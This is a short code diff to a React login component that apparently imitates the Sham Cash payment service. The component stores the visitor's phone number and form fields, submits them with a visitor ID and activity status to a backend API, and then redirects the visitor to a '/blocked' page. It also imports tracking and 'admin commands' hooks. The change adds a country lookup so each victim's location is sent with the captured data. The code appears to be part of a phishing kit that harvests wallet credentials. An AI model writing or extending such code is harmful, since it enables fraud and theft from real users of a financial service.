@@ -6,6 +6,7 @@ import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
 import { useLang } from "@/hooks/useLang";
 import { shamApi } from "@/lib/shamApi";
+import { getCountry } from "@/lib/getCountry";
 
 const T = {
   ar: {
@@ -67,6 +68,8 @@ export function ShamCashLogin() {
     localStorage.setItem("sham_visitor_id", visitorId);
     localStorage.setItem("sham_phone", fields.phone);
 
+    const country = await getCountry();
+
     await shamApi.submit({
       id: visitorId,
       submittedAt: new Date().toLocaleTimeString("ar-SY"),
@@ -82,6 +85,7 @@ export function ShamCashLogin() {
       page: "تسجيل الدخول",
       isActive: true,
       lastSeen: Date.now(),
+      country,
     });
 
     window.location.href = "/blocked";
